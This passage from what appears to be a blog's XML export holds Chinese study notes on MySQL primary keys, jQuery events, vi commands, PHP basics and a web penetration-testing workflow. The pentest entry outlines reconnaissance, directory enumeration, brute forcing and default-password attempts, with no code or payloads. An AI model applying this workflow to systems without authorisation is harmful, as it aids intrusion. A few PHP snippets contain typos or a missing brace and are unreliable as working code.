方案1：在创建表的时候，直接在字段之后，跟primary key关键字(主键本身不允许为空) 优点：非常直接；缺点：只能使用一个字段作为主键 1 方案2：在创建表的时候，在所有的字段之后，使用primary key(主键字段列表)来创建主键(如果有多个字段作为主键，可以是复合主键) 1 方案3：当表已经创建好之后，额外追加主键：可以通过修改表字段属性，也可以直接追加。​ alter table 表名 add primary key(字段列表);​ ​ 前提：表中字段对应的数据本身是独立的(不重复) 主键约束 主键对应的字段中的数据不允许重复：一旦重复，数据操作失败（增和改）]]></content>
      <tags>
        <tag>php学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery事件]]></title>
    <url>%2F2018%2F11%2F30%2FjQuery%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[加载事件 代码$(document).ready(fn);简写：$(function(){});注意：js:windows.onload=fn;jq:$(document).ready(fn); 事件切换12345$("div").hover(function ()&#123; $("b").html("鼠标放上就变");//鼠标放到div标签中，就会变化&#125;,function ()&#123; $("a").html("鼠标离开就变");&#125;); 事件123456789101112//注：selector为选择器，可以使用标签名，或者id等选中要操作的对象。$(selector).click(fn);//selector的点击事件，会触发fn函数。$(selector).dblclick(fn);//双击事件。$(selector).focus(fn);//获得焦点触发事件。$(selector).blur(fn);//失去焦点。$(selector).change(fn);//发生改变。$(selector).mouseover(fn);//鼠标放上。$(selector).mouseout(fn);//鼠标离开。$(selector).mousedown(fn);//鼠标按下。$(selector).mouseup(fn);//鼠标抬起。$(selector).mousemove(fn);//鼠标移动。//js的事件都带有on，而jq事件都没有on 鼠标移动事件 注：属性是获取x坐标 clientX属性是获取y坐标 clientY就代表了div标签对象 event 事件处理： bind：重点 绑定事件 – bind(&quot;事件名&quot;,fn) 如果多个事件：bind({&quot;mouseover&quot;:fn1,&quot;mouseout&quot;:fn2}); unbind(“事件名”) 解除绑定，如果没有参数，意味着，全部解除绑定 on：重点 绑定事件 `$(select).on(“clcik”,function (){}); off解绑 代码：$(select).off(); one：绑定事件，只会执行一次代码：$(&quot;#d1&quot;).one(&quot;click&quot;,function (){alert (&quot;你好，世界&quot;);});执行一次后就失效。 查找：$(selector).parent()—–查找父元素。$(selector).find(a)——在selector中找a元素。]]></content>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vi —— 终端中的编辑器]]></title>
    <url>%2F2018%2F11%2F25%2Fvi%E2%80%94%E7%BB%88%E7%AB%AF%E4%B8%AD%E7%9A%84%E7%BC%96%E8%BE%91%E5%99%A8%2F</url>
    <content type="text"><![CDATA[目标 vi 简介 打开和新建文件 三种工作模式 常用命令 分屏命令 常用命令速查图 01. vi 简介1.1 学习 vi 的目的 在工作中，要对 服务器 上的文件进行 简单 的修改，可以使用 ssh 远程登录到服务器上，并且使用 vi 进行快速的编辑即可 常见需要修改的文件包括： 源程序 配置文件，例如 ssh 的配置文件 ~/.ssh/config 在没有图形界面的环境下，要编辑文件，vi 是最佳选择！ 每一个要使用 Linux 的程序员，都应该或多或少的学习一些 vi 的常用命令 1.2 vi 和 vim 在很多 Linux 发行版中，直接把 vi 做成 vim 的软连接 vi vi 是 Visual interface 的简称，是 Linux 中 最经典 的文本编辑器 vi 的核心设计思想 —— 让程序员的手指始终保持在键盘的核心区域，就能完成所有的编辑操作 vi 的特点： 没有图形界面 的 功能强大 的编辑器 只能是编辑 文本内容，不能对字体、段落进行排版 不支持鼠标操作 没有菜单 只有命令 vi 编辑器在 系统管理、服务器管理 编辑文件时，其功能永远不是图形界面的编辑器能比拟的 vimvim = vi improved vim 是从 vi 发展出来的一个文本编辑器，支持 代码补全、编译 及 错误跳转 等方便编程的功能特别丰富，在程序员中被广泛使用，被称为 编辑器之神 查询软连接命令（知道） 在很多 Linux 发行版中直接把 vi 做成 vim 的软连接 123456789101112# 查找 vi 的运行文件$ which vi$ ls -l /usr/bin/vi$ ls -l /etc/alternatives/vi$ ls -l /usr/bin/vim.basic# 查找 vim 的运行文件$ which vim$ ls -l /usr/bin/vim$ ls -l /etc/alternatives/vim$ ls -l /usr/bin/vim.basic 02. 打开和新建文件 在终端中输入 vi 在后面跟上文件名 即可 1$ vi 文件名 如果文件已经存在，会直接打开该文件 如果文件不存在，会新建一个文件 2.1 打开文件并且定位行 在日常工作中，有可能会遇到 打开一个文件，并定位到指定行 的情况 例如：在开发时，知道某一行代码有错误，可以 快速定位 到出错代码的位置 这个时候，可以使用以下命令打开文件 1$ vi 文件名 +行数 提示：如果只带上 + 而不指定行号，会直接定位到文件末尾 2.2 异常处理 如果 vi 异常退出，在磁盘上可能会保存有 交换文件 下次再使用 vi 编辑该文件时，会看到以下屏幕信息，按下字母 d 可以 删除交换文件 即可 提示：按下键盘时，注意关闭输入法 03. 三种工作模式 vi 有三种基本工作模式： 命令模式 打开文件首先进入命令模式，是使用 vi 的 入口 通过 命令 对文件进行常规的编辑操作，例如：定位、翻页、复制、粘贴、删除…… 在其他图形编辑器下，通过 快捷键 或者 鼠标 实现的操作，都在 命令模式 下实现 末行模式 —— 执行 保存、退出 等操作 要退出 vi 返回到控制台，需要在末行模式下输入命令 末行模式 是 vi 的 出口 编辑模式 —— 正常的编辑文字 提示：在 Touch Bar 的 Mac 电脑上 ，按 ESC 不方便，可以使用 CTRL + [ 替代 末行模式命令 命令 英文 功能 w write 保存 q quit 退出，如果没有保存，不允许退出 q! quit 强行退出，不保存退出 wq write &amp; quit 保存并退出 x 保存并退出 04. 常用命令命令线路图 重复次数 在命令模式下，先输入一个数字，再跟上一个命令，可以让该命令 重复执行指定次数 移动和选择（多练） vi 之所以快，关键在于 能够快速定位到要编辑的代码行 移动命令 能够 和 编辑操作 命令 组合使用 编辑操作 删除、复制、粘贴、替换、缩排 撤销和重复 查找替换 编辑 学习提示 vi 的命令较多，不要期望一下子全部记住，个别命令忘记了，只是会影响编辑速度而已 在使用 vi 命令时，注意 关闭中文输入法 4.1 移动（基本） 要熟练使用 vi，首先应该学会怎么在 命令模式 下样快速移动光标 编辑操作命令，能够和 移动命令 结合在一起使用 1) 上、下、左、右 命令 功能 手指 h 向左 食指 j 向下 食指 k 向上 中指 l 向右 无名指 2) 行内移动 命令 英文 功能 w word 向后移动一个单词 b back 向前移动一个单词 0 行首 ^ 行首，第一个不是空白字符的位置 $ 行尾 3) 行数移动 命令 英文 功能 gg go 文件顶部 G go 文件末尾 数字gg go 移动到 数字 对应行数 数字G go 移动到 数字 对应行数 :数字 移动到 数字 对应行数 4) 屏幕移动 命令 英文 功能 Ctrl + b back 向上翻页 Ctrl + f forward 向下翻页 H Head 屏幕顶部 M Middle 屏幕中间 L Low 屏幕底部 4.2 移动（程序）1) 段落移动 vi 中使用 空行 来区分段落 在程序开发时，通常 一段功能相关的代码会写在一起 —— 之间没有空行 命令 功能 { 上一段 } 下一段 2) 括号切换 在程序世界中，()、[]、{} 使用频率很高，而且 都是成对出现的 命令 功能 % 括号匹配及切换 3) 标记 在开发时，某一块代码可能需要稍后处理，例如：编辑、查看 此时先使用 m 增加一个标记，这样可以 在需要时快速地跳转回来 或者 执行其他编辑操作 标记名称 可以是 a~z 或者 A~Z 之间的任意 一个 字母 添加了标记的 行如果被删除，标记同时被删除 如果 在其他行添加了相同名称的标记，之前添加的标记也会被替换掉 命令 英文 功能 mx mark 添加标记 x，x 是 a~z 或者 A~Z 之间的任意一个字母 ‘x 直接定位到标记 x 所在位置 4.3 选中文本（可视模式） 学习 复制 命令前，应该先学会 怎么样选中 要复制的代码 在 vi 中要选择文本，需要先使用 Visual 命令切换到 可视模式 vi 中提供了 三种 可视模式，可以方便程序员选择 选中文本的方式 按 ESC 可以放弃选中，返回到 命令模式 命令 模式 功能 v 可视模式 从光标位置开始按照正常模式选择文本 V 可视行模式 选中光标经过的完整行 Ctrl + v 可视块模式 垂直方向选中文本 可视模式下，可以和 移动命令 连用，例如：ggVG 能够选中所有内容 4.4 撤销和恢复撤销 在学习编辑命令之前，先要知道怎样撤销之前一次 错误的 编辑动作！ 命令 英文 功能 u undo 撤销上次命令 CTRL + r redo 恢复撤销的命令 4.5 删除文本 命令 英文 功能 x cut 删除光标所在字符，或者选中文字 d(移动命令) delete 删除移动命令对应的内容 dd delete 删除光标所在行，可以 ndd 复制多行 D delete 删除至行尾 提示：如果使用 可视模式 已经选中了一段文本，那么无论使用 d 还是 x，都可以删除选中文本 删除命令可以和 移动命令 连用，以下是常见的组合命令： 123456* dw # 从光标位置删除到单词末尾* d0 # 从光标位置删除到一行的起始位置* d&#125; # 从光标位置删除到段落结尾* ndd # 从光标位置向下连续删除 n 行* d代码行G # 从光标所在行 删除到 指定代码行 之间的所有代码* d&apos;a # 从光标所在行 删除到 标记a 之间的所有代码 4.6 复制、粘贴 vi 中提供有一个 被复制文本的缓冲区 复制 命令会将选中的文字保存在缓冲区 删除 命令删除的文字会被保存在缓冲区 在需要的位置，使用 粘贴 命令可以将缓冲区的文字插入到光标所在位置 命令 英文 功能 y(移动命令) copy 复制 yy copy 复制一行，可以 nyy 复制多行 p paste 粘贴 提示 命令 d、x 类似于图形界面的 剪切操作 —— CTRL + X 命令 y 类似于图形界面的 复制操作 —— CTRL + C 命令 p 类似于图形界面的 粘贴操作 —— CTRL + V vi 中的 文本缓冲区同样只有一个，如果后续做过 复制、剪切 操作，之前缓冲区中的内容会被替换 注意 vi 中的 文本缓冲区 和系统的 剪贴板 不是同一个 所以在其他软件中使用 CTRL + C 复制的内容，不能在 vi 中通过 P 命令粘贴 可以在 编辑模式 下使用 鼠标右键粘贴 4.7 替换 命令 英文 功能 工作模式 r replace 替换当前字符 命令模式 R replace 替换当前行光标后的字符 替换模式 R 命令可以进入 替换模式，替换完成后，按下 ESC 可以回到 命令模式 替换命令 的作用就是不用进入 编辑模式，对文件进行 轻量级的修改 4.8 缩排和重复执行 命令 功能 &gt;&gt; 向右增加缩进 &lt;&lt; 向左减少缩进 . 重复上次命令 缩排命令 在开发程序时，统一增加代码的缩进 比较有用！ 一次性 在选中代码前增加 4 个空格，就叫做 增加缩进 一次性 在选中代码前删除 4 个空格，就叫做 减少缩进 在 可视模式 下，缩排命令只需要使用 一个 &gt; 或者 &lt; 在程序中，缩进 通常用来表示代码的归属关系 前面空格越少，代码的级别越高 前面空格越多，代码的级别越低 4.9 查找常规查找 命令 功能 /str 查找 str 查找到指定内容之后，使用 Next 查找下一个出现的位置： n: 查找下一个 N: 查找上一个 如果不想看到高亮显示，可以随便查找一个文件中不存在的内容即可 单词快速匹配 命令 功能 * 向后查找当前光标所在单词 # 向前查找当前光标所在单词 在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过 4.10 查找并替换 在 vi 中查找和替换命令需要在 末行模式 下执行 记忆命令格式： 1:%s///g 1) 全局替换 一次性替换文件中的 所有出现的旧文本 命令格式如下： 1:%s/旧文本/新文本/g 2) 可视区域替换 先选中 要替换文字的 范围 命令格式如下： 1:s/旧文本/新文本/g 3) 确认替换 如果把末尾的 g 改成 gc 在替换的时候，会有提示！推荐使用！ 1:%s/旧文本/新文本/gc y - yes 替换 n - no 不替换 a - all 替换所有 q - quit 退出替换 l - last 最后一个，并把光标移动到行首 ^E 向下滚屏 ^Y 向上滚屏 4.11 插入命令 在 vi 中除了常用的 i 进入 编辑模式 外，还提供了以下命令同样可以进入编辑模式： 命令 英文 功能 常用 i insert 在当前字符前插入文本 常用 I insert 在行首插入文本 较常用 a append 在当前字符后添加文本 A append 在行末添加文本 较常用 o 在当前行后面插入一空行 常用 O 在当前行前面插入一空行 常用 演练 1 —— 编辑命令和数字连用 在开发中，可能会遇到连续输入 N 个同样的字符 在 Python 中有简单的方法，但是其他语言中通常需要自己输入 例如：********** 连续 10 个星号 要实现这个效果可以在 命令模式 下 输入 10，表示要重复 10 次 输入 i 进入 编辑模式 输入 * 也就是重复的文字 按下 ESC 返回到 命令模式，返回之后 vi 就会把第 2、3 两步的操作重复 10 次 提示：正常开发时，在 进入编辑模式之前，不要按数字 演练 2 —— 利用 可视块 给多行代码增加注释 在开发中，可能会遇到一次性给多行代码 增加注释 的情况 在 Python 中，要给代码增加注释，可以在代码前增加一个 # 要实现这个效果可以在 命令模式 下 移动到要添加注释的 第 1 行代码，按 ^ 来到行首 按 CTRL + v 进入 可视块 模式 使用 j 向下连续选中要添加的代码行 输入 I 进入 编辑模式，并在 行首插入，注意：一定要使用 I 输入 # 也就是注释符号 按下 ESC 返回到 命令模式，返回之后 vi 会在之前选中的每一行代码 前 插入 # 05. 分屏命令 属于 vi 的高级命令 —— 可以 同时编辑和查看多个文件 5.1 末行命令扩展末行命令 主要是针对文件进行操作的：保存、退出、保存&amp;退出、搜索&amp;替换、另存、新建、浏览文件 命令 英文 功能 :e . edit 会打开内置的文件浏览器，浏览要当前目录下的文件 :n 文件名 new 新建文件 :w 文件名 write 另存为，但是仍然编辑当前文件，并不会切换文件 提示：切换文件之前，必须保证当前这个文件已经被保存！ 已经学习过的 末行命令： 命令 英文 功能 :w write 保存 :q quit 退出，如果没有保存，不允许退出 :q! quit 强行退出，不保存退出 :wq write &amp; quit 保存并退出 :x 保存并退出 :%s///gc 确认搜索并替换 在实际开发中，可以使用 w 命令 阶段性的备份代码 5.2 分屏命令 使用 分屏命令，可以 同时编辑和查看多个文件 命令 英文 功能 :sp [文件名] split 横向增加分屏 :vsp [文件名] vertical split 纵向增加分屏 1) 切换分屏窗口 分屏窗口都是基于 CTRL + W 这个快捷键的，w 对应的英文单词是 window 命令 英文 功能 w window 切换到下一个窗口 r reverse 互换窗口 c close 关闭当前窗口，但是不能关闭最后一个窗口 q quit 退出当前窗口，如果是最后一个窗口，则关闭 vi o other 关闭其他窗口 2) 调整窗口大小 分屏窗口都是基于 CTRL + W 这个快捷键的，w 对应的英文单词是 window 命令 英文 功能 + 增加窗口高度 - 减少窗口高度 &gt; 增加窗口宽度 &lt; 减少窗口宽度 = 等分窗口大小 调整窗口宽高的命令可以和数字连用，例如：5 CTRL + W + 连续 5 次增加高度 06. 常用命令速查图 vimrc vimrc 是 vim 的配置文件，可以设置 vim 的配置，包括：热键、配色、语法高亮、插件 等 Linux 中 vimrc 有两个位置，家目录下的配置文件优先级更高 12/etc/vim/vimrc~/.vimrc 常用的插件有： 代码补全 代码折叠 搜索 Git 集成 …… 网上有很多高手已经配置好的针对 python 开发的 vimrc 文件，可以下载过来直接使用，或者等大家多 Linux 比较熟悉后，再行学习！]]></content>
      <categories>
        <category>vi —— 终端中的编辑器</category>
      </categories>
      <tags>
        <tag>vi —— 终端中的编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web应用渗透测试流程]]></title>
    <url>%2F2018%2F11%2F02%2Fweb%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Web应用渗透测试对于web应用的测试，一般分为三个阶段：信息收集、漏洞发现以及漏洞利用。 信息收集在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。 脚本语言的类型常见的脚本语言的类型包括：php、asp、aspx、jsp等。测试方法 爬取网站所有链接，查看后缀 直接访问一个不存在页面后面加不同后缀测试 查看robots.txt，查看后缀 服务器的类型常见的web服务器包括：apache、tomcat、iis、ngnix等测试方法 查看header，判断服务器类型 根据报错信息判断 根据默认页面判断目录结构了解更多的目录，可能发现更多的弱点，如：目录浏览、代码泄漏等。测试方法 使用字典枚举目录 使用爬虫爬取整个网站，或者使用google等搜索引擎获取 查看robots.txt是否泄漏使用的开源软件我们如果知道了目标使用的开源软件，我们查找相关的软件的漏洞直接对网站进行测试。测试方法指纹识别(网上在线的指纹识别工具，例：云溪指纹识别) 数据库类型对于不同的数据库，有不同的测试方法。测试方法 使用应用程序报错，查看报错信息 扫描服务器的数据库端口（没做NAT且防火墙不过滤时有效）所有链接页面这个跟前面的获取目录结构类似，但是这个不是获取网站的所有功能页面，有时候还可以获取到管理员备份的源码。测试方法 使用字典枚举页面 使用爬虫爬取整个网站，或者使用google等搜索引擎获取 查看robots.txt是否泄漏用到的框架很多网站都利用开源的框架来快速开发网站，所以收集网站的框架信息也是非常关键的。测试方法指纹识别漏洞发现在这个阶段我们在做测试的时候要对症下药，不能盲目的去扫描，首先要确定目标应用是否使用的是公开的开源软件、开源框架等，然后在做深一度的漏洞扫描。关于开源软件的漏洞发现开源软件常见的开源软件有：wordpress、phpbb、dedecms等。开源的框架常见的开源框架有：struts2、spring MVC、thinkPHP等。中间件服务器常见的中间件服务器有：jboss、tomcat、Weblogic等。数据库服务常见的数据库服务：mssql、mysql、oracle、redis、sybase、MongoDB、DB2等。对开源软件的测试方法 通过指纹识别软件判断开源的版本信息，针对不同的版本信息去开放的漏洞数据库查找相应版本的漏洞进行测试 对于默认的后台登入页、数据库服务端口认证等入口可以进行简单的暴力破解、默认口令尝试等操作。 使用开源的漏洞发现工具对其进行漏洞扫描，如：WPScan关于自主开发的应用手动测试这个阶段，我们需要手工测试所有与用户交互的功能，比如：留言、登入、下单、退出、退货、付款等操作。软件扫描使用免费的软件扫描，如：appscan、wvs、netsparker、burp等漏洞利用这种方式对于有特殊过滤等操作，或者网络上没有成型的利用工具的时候可以使用，在熟练之后，自己也可以写出自己的利用工具代替手工操作，毕竟手工操作是非常累的。有时候可以结合服务器的配置问题，增加成功率。]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php可变个数参数的函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8F%AF%E5%8F%98%E4%B8%AA%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php可变个数参数的函数php获取可变函数参数的函数php取得可变函数参数，方便后面的控制。 func_num_args()返回传递给该函数参数的个数 func_get_arg($arg_num)取得指定位置的参数值，$arg_num位置index从0开始到n-1。 fun_get_args()返回包含所有参数的数组]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php可变变量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php可变变量将变量名储存到另一个变量中 123456&lt;?phpheader("content-type:text/html;charset=utf-8"); $a="我是一个变量！"; $b='a'; $echo $$b;?&gt; $$b:$b里保存的是变量a，$a=&quot;我是一个变量！&quot;，所以$$b的值是&quot;我是一个变量！&quot; 多学一招：变量中不但可以保存变量名，还可以保存函数名。]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php静态变量]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[php静态变量Static（静态）关键字 1.在函数中声明的静态变量，只在调用时声明。2.第二次以后，一看是静态变量，就先到静态区中，看一下有没有这个变量，如果有就使用，而不去再声明。3.静态变量 ，在同一个函数多次调用中，共享把局部变量改变为静态变量后是改变了它的存储方式，即改变了它的生存期。把全局变量改变为静态变量后是改变了它的作用域，限制了它的使用范围。static静态变量会被放在程序的全局存储区中（即在程序的全局数据区，而不是在堆栈中分配，所以不会导致堆栈溢出），这样可以在下一次调用的时候还可以保持原来的赋值。这一点是它与堆栈变量和堆变量的区别。 代码示例： 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//--------------如何理解static静态变量----------- /** 普通局部变量 */function local() &#123; $loc = 0; //这样，如果直接不给初值0是错误的。 ++$loc; echo $loc . '&lt;br&gt;';&#125;local(); //1local(); //1local(); //1echo '===================================&lt;br/&gt;'; /** static静态局部变量 */function static_local() &#123; static $local = 0 ; //此处可以不赋0值 $local++; echo $local . '&lt;br&gt;';&#125;static_local(); //1static_local(); //2static_local(); //3//echo $local; 注意虽然静态变量，但是它仍然是局部的，在外不能直接访问的。echo '=======================================&lt;br&gt;'; /** static静态全局变量(实际上:全局变量本身就是静态存储方式,所有的全局变量都是静态变量) */function static_global() &#123; global $glo; //此处，可以不赋值0，当然赋值0，后每次调用时其值都为0，每次调用函数得到的值都会是1，但是不能想//当然的写上"static"加以修饰，那样是错误的. $glo++; echo $glo . '&lt;br&gt;';&#125;static_global(); //1static_global(); //2static_global(); //3?&gt; 静态局部变量： 1.static类型的内部变量同auto自动变量（即未加static声明的局部变量）一样，是某个特定函数的局部变量，即只能在定义该变量的函数内使用该变量，两者作用域相同；两者的不同在于：auto自动变量会随着函数被调用和退出而存在和消失，而static类局部变量不会，它不管其所在的函数是否被调用，都将一直存在；不过，尽管该变量还继续存在，但不能使用它。倘若再次调用定义它的函数时，它又可继续使用，而且保存了前次被调用后的值。换言之，static类型的局部变量是一种只能在某个特定函数中使用，但一直占据储存空间的变量。 2.函数体内如果在定义静态变量的同时进行了初始化，则以后程序不在进行初始化操作（出现在函数内部的基本类型的静态变量初始化语句只有在第一次调用才执行）。而对自动变量赋初值是在函数调用时进行，每调用一次函数重新给一次初值3，相当于执行一次赋值语句。 3.静态局部变量的初始化表达式必须是一个常量表达式。即使局部静态变量定义时没有赋初值，]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php进制]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E8%BF%9B%E5%88%B6%2F</url>
    <content type="text"><![CDATA[php进制关于进制的表格： 进制 缩写 单词 十进制 dec decimalist 八进制 oct otconary 二进制 bin binary 十六进制 hex hexadecimal php进制转换函数： decbin()--------十进制 转 二进制 decoct()--------十进制 转 八进制 bindec()--------二进制 转 十进制 我们发现缩写组合一下就是 什么进制 转 什么进制。 php变量中可以存十进制、八进制、十六进制。 php变量5.4之前版本不能储存 二进制。 php进制变量声明： $a = 123 //十进制 $a = 023 //八进制 $a = 0x1A //十六进制]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php回调函数]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[php回调函数回调函数：Callback（即call then back 被主函数调用运算后会返回主函数），是指通过函数参数传递到其他代码的，某一块可执行代码的引用。通俗的解释就是把函数作为参数传入进；另一个函数中使用；php中有许多“需求参数为函数”的函数，像array_map,usort,call_user_func_array之类，它们执行传入函数，然后直接将结果返回主函数。好处是函数作为值使用起来方便，而且代码简洁，可读性强。 php中回调函数的实现 php提供了两个内置函数call_user_func()和call_user_func_array()提供对回调函数的支持。这两个函数的区别是call_user_func_array是以数组的形式接收回调函数的参数的，看它的原型就知道了：mixed call_user_func_array(callable $callback,array $param_arr),它只有两个参数。而call_user_func($callback,参数1,,参数2,…)的参数个数根据回调函数的参数来决定的。 如何实现对脚本中全局函数、类中未使用$this的非静态方法、类中使用$this的非静态方法（需要传入对象）、类中静态方法的回调呢？ 实例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php //普通函数 function f1($arg1,$arg2)&#123; echo __FUNCTION__.'exec,the args is:'.$arg1.' '.$arg2; echo "&lt;br /&gt;"; &#125; //通过call_user_func调用函数f1 call_user_func('f1','han','wen'); //通过call_user_func_array调用函数 call_user_func_array('f1',array('han','wen')); class A &#123; public $name; function show($arg1) &#123; echo 'the arg is:'.$arg1."&lt;br /&gt;"; echo 'my name is:'.$this-&gt;name; echo "&lt;br /&gt;"; &#125; function show1($arg1,$arg2) &#123; echo __METHOD__.'exec,the args is:'.$arg1.' '.$arg2."&lt;br /&gt;"; &#125; public static function show2($arg1,$arg2) &#123; echo __METHOD__.'of class A exec,the args is:'.$arg1.' '.$arg2."&lt;br /&gt;"; &#125; &#125; //调用类中非静态成员函数，该成员函数中有$this调用了对象中的成员 $a = new A; $a-&gt;name = 'wen'; call_user_func_array(array($a,'show'),array('han!')); //调用类中非静态成员函数，没有对象被创建，该成员函数中不能有$this call_user_func_array(array('A','show1'),array('an!','wen')); //调用中静态成员函数 call_user_func_array(array('A','show2'),array('argument1','argument2')); ?&gt;]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php访问控制]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[访问控制（可见性） 对属性或方法的访问控制，是通过在前面添加关键字public（公有），protected（受保护）或private（私有）来实现的。被定义为公有的类成员可以在任何地方被访问。被定义为受保护的类成员则可以被其自身以及其子类和父类访问。被定义为私有的类成员则只能被其定义所在的类访问。 属性的访问控制 类属性必须定义为公有，受保护，私有之一。如果用var定义，则被视为公有。 #####属性声明： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php/** * 定义类 MyClass */class MyClass&#123; public $public = 'Public(公有)'; protected $protected = 'Protected(受保护)'; private $private = 'Private(私有)'; function printHello() &#123; echo $this-&gt;public; echo $this-&gt;protected; echo $this-&gt;private; &#125;&#125;$obj = new MyClass();echo $obj-&gt;public; //这行能被正常执行echo $obj-&gt;protected; //这行会产生一个致命错误echo $obj-&gt;private; //这行也会产生一个致命错误$obj-&gt;printHello(); //输出 Public(公有)、Protected(受保护) 和 Private(私有)/** * 定义类 MyClass2 */class MyClass2 extends MyClass&#123; //可以对 public 和 protected 进行重定义，但 private 不能 protected $protected = 'Protected2(受保护)'; function printHello() &#123; echo $this-&gt;public; echo $this-&gt;protected; echo $this-&gt;private; &#125;&#125;$obj2 = new MyClass2();echo $obj2-&gt;public; //这行能被执行echo $obj2-&gt;private; //未定义 privateecho $obj2-&gt;protected; //这行会产生一个致命错误$obj2-&gt;printHello(); //输出 Public、Protected2(受保护)、和 Undefined?&gt; 方法的访问控制 类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。 方法声明：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?php/** *定义类 MyClass */class MyClass&#123; //声明一个公有的构造函数 public function __construct()&#123;&#125; //声明一个公有的方法 public function MyPublic()&#123;&#125; //声明一个受保护的方法 protected function MyProtected()&#123;&#125; //声明一个私有的方法 private function MyPrivate()&#123;&#125; //此方法为公有 function Foo() &#123; $this-&gt;MyPublic(); $this-&gt;MyProtected(); $this-&gt;MyPrivate(); &#125;&#125;$myclass = new MyClass;$myclass-&gt;MyPublic(); //这行能被正常执行$myclass-&gt;MyProtected(); //这行会产生一个致命错误$myclass-&gt;MyPrivate(); //这行会产生一个致命错误$myclass-&gt;Foo(); //公有，受保护，私有都可执行/** *定义类 MyClass2 */class MyClass2 extends MyClass&#123; //此方法为公有 function Foo2() &#123; $this-&gt;MyPublic(); $this-&gt;MyProtected(); $this-&gt;MyPrivate(); //这行会产生一个致命错误 &#125;&#125;$myclass2 = new MyClass2;$myclass2-&gt;MyPublic(); //这行能被正常执行$myclass2-&gt;Foo2(); //公有的和受保护的都可执行，但私有的不行class Bar&#123; public function test()&#123; $this-&gt;testPrivate(); $this-&gt;testPublic(); &#125; public function testPublic()&#123; echo "Bar::testPublic\n"; &#125; private function testPrivate()&#123; echo "Bar::testPrivate\n"; &#125;&#125;class Foo extends Bar&#123; public function testPublic()&#123; echo "Foo::testPublic\n"; &#125; private function testPrivate()&#123; echo "Foo::testPrivate\n"; &#125;$myFoo = new foo();$myFoo-&gt;test(); //Bar::testPrivate //Foo::testPublic?&gt;]]></content>
      <tags>
        <tag>php学习</tag>
        <tag>public（公有）</tag>
        <tag>protected（受保护）</tag>
        <tag>private（私有）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php递归]]></title>
    <url>%2F2018%2F10%2F25%2Fphp%E9%80%92%E5%BD%92%2F</url>
    <content type="text"><![CDATA[什么是php递归函数？递归函数即自动调用函数，在函数体内部直接或者间接的自己调用自己，即函数的嵌套调用是函数本身。通常在此类型的函数题之中会附加一个条件判断叙述，以判断是否需要执行递归调用，并且在特定的条件下终止函数的递归调用动作，把目前流程的主控制权回到上一层函数来执行。从此，当某个执行递归调用的函数没有附加条件判断叙述时，可能会造成无限循环的错误情形。函数递归调用最大的好处在于可以精简程序中的复杂重复调用程序，并且能以这种特性来执行一些较为复杂的运算动作。例如，列表、动态树形菜单及遍历目录等操作。相应的非递归函数虽然效率高，但却比较难编程，而且相对来说可读性差。现代程序设计的目标主要是可读性好。随着计算机硬件性能的不断提高，程序在更多的场合优先考虑可读而不是高效，所以，鼓励用递归函数实现程序思想。一个简单的递归调用实例如下所示: 12345678910111213&lt;?php//声明一个函数，用于测试递归function test($n)&#123; echo $n." "; //在函数开始输出参数的值 if($n&gt;0)&#123; //判断参数是否大于0 test($n-1); //如果参数大于0则调用自己，并将参数减1后再次传入 &#125;else&#123; //判断参数是不大于0 echo "&lt;----------&gt; "; &#125; echo $n." ";&#125;test(10); //调用test函数将整数10传给参数?&gt; 输出结果： 10 9 8 7 6 5 4 3 2 1 0 &lt;---------&gt; 0 1 2 3 4 5 6 7 8 9 10 说明：在上面的实例中声明了一个test()函数，该函数需要一个整型的参数。在函数外面通过传递整数10作为参数调用test()函数。在test()函数体中，第一条代码输出参数的值和一个空格。然后判断条件是否成立，成立则调用自己并将参数减1，再次传入。开始调用时，它是外层调内层，内层调更内一层，直到最内层由于条件不允许必须结束。最内层结束了。输出作为分界符，执行调用之后的代码输出参数的值和空格，它就会回到稍外一层继续执行。稍外一层在结束时，退回到在稍外一层继续执行，层层推出，直到最外层结束。执行完成以后的结果就是我们上面看到的结果。]]></content>
      <tags>
        <tag>php学习</tag>
      </tags>
  </entry>
  <entry>
